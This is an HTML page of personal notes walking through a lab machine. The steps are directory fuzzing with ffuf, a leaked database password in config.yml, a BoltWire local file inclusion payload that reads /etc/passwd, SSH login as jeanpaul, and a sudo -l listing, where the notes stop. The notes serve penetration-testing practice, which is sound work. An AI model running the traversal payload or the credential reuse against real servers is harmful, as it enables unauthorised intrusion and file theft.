@@ -1,0 +1,80 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>ffuf</title>
+</head><body>──(root㉿kali)-[/home/kali]<br/>
+└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.205.132/FUZZ<br/>
+<br/>
+We got various directory in the output of FFUF but we got some information from app directory (i.e. config.yml file)<br/>
+<br/>
+Web-browser: http://192.168.205.132/app/config/config.yml<br/>
+database: <br/>
+driver: sqlite <br/>
+databasename: bolt <br/>
+username: bolt <br/>
+password: I_love_java <br/>
+<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.205.132:8080/FUZZ<br/>
+And from this FFUF output we were able to see two directory's (i.e. dev and server-status)<br/>
+<br/>
+Web-Browser : http://192.168.205.132:8080/dev/<br/>
+<br/>
+Will <b>register</b>as a member in the website but was not able to do anything in it.<br/>
+So will Google if there are any exploits in the Boltwire or not<br/>
+- File Inclusion <br/>
+<br/>
+or <br/>
+<br/>
+Can use Linux inbuilt feature to find it<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# searchsploit boltwire   <br/>
+----------------------------------------------------------------------------------------------------- ---------------------------------<br/>
+Exploit Title                                            | Path<br/>
+----------------------------------------------------------------------------------------------------- ---------------------------------<br/>
+BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities             | php/webapps/36552.txt<br/>
+BoltWire 6.03 - Local File Inclusion                                 | php/webapps/48411.txt<br/>
+----------------------------------------------------------------------------------------------------- ---------------------------------<br/>
+Shellcodes: No Results<br/>
+<br/>
+So will not usue Cross-Site scripting Cuz we are not attacking any users but the box <br/>
+<br/>
+What is Local File Inclusion ??<br/>
+Allows us to potentially expose the Files that are running on the server <br/>
+Website : <a href="https://www.exploit-db.com/exploits/48411">https://www.exploit-db.com/exploits/48411</a><br/>
+<br/>
+Command : http://192.168.51.169/boltwire/index.php?p=action.search&amp;<b>action=../../../../../../../etc/passwd </b><br/>
+where it is taking <b>action=../../../../../../../etc/passwd </b>as input (i.e. ../../../ saying that we want to go back far as possible to a base directory and than etc/passwd)<br/>
+<br/>
+Will paste : index.php?p=action.search&amp;<b>action=../../../../../../../etc/passwd </b><br/>
+And were able to get this infor <br/>
+jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash<br/>
+<br/>
+Now we can join the dots with all the info that we have gathered so far that JP is jeanpaul and can use the password mentioend in the <br/>
+.yml for the ssh login.<br/>
+<br/>
+┌──(root㉿kali)-[/mnt/dev]<br/>
+└─# ssh -i id_rsa jeanpaul@192.168.205.132<br/>
+Enter passphrase for key 'id_rsa': <br/>
+Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Wed Jun 2 05:25:21 2021 from 192.168.10.31<br/>
+jeanpaul@dev:~$ <br/>
+<br/>
+When we have done Sudo -l<br/>
+we got this as output <br/>
+<br/>
+jeanpaul@dev:~$ sudo -l<br/>
+Matching Defaults entries for jeanpaul on dev:<br/>
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br/>
+<br/>
+User jeanpaul may run the following commands on dev:<br/>
+  (root) NOPASSWD: /usr/bin/zip<br/>
+<br/>
+</body></html>
